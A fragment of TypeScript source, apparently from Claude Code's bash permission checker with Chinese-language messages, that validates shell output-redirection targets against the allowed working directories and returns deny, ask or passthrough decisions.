      if (isNullRedirectionTarget(redir.target)) continue

      const { allowed, resolvedPath, decisionReason } = validatePath(
        redir.target,
        cwd,
        toolPermissionContext,
        'create',
      )

      if (!allowed) {
        const workingDirs = Array.from(
          allWorkingDirectories(toolPermissionContext),
        )
        const dirListStr = formatDirectoryList(workingDirs)

        const message =
          decisionReason?.type === 'other' ||
          decisionReason?.type === 'safetyCheck'
            ? decisionReason.reason
            : `输出重定向到 '${resolvedPath}' 被阻止。出于安全考虑，Claude Code 在此会话中只能写入允许的工作目录中的文件：${dirListStr}。`

        if (decisionReason?.type === 'rule') {
          return {
            behavior: 'deny',
            message,
            decisionReason,
          }
        }

        firstAsk ??= {
          behavior: 'ask',
          message,
          blockedPath: resolvedPath,
          decisionReason,
          suggestions: [
            {
              type: 'addDirectories',
              directories: [getDirectoryForPath(resolvedPath)],
              destination: 'session',
            },
          ],
        }
      }
    }
  }

  return (
    firstAsk ?? {
      behavior: 'passthrough',
      message: '所有路径约束验证成功',
    }
  )
}
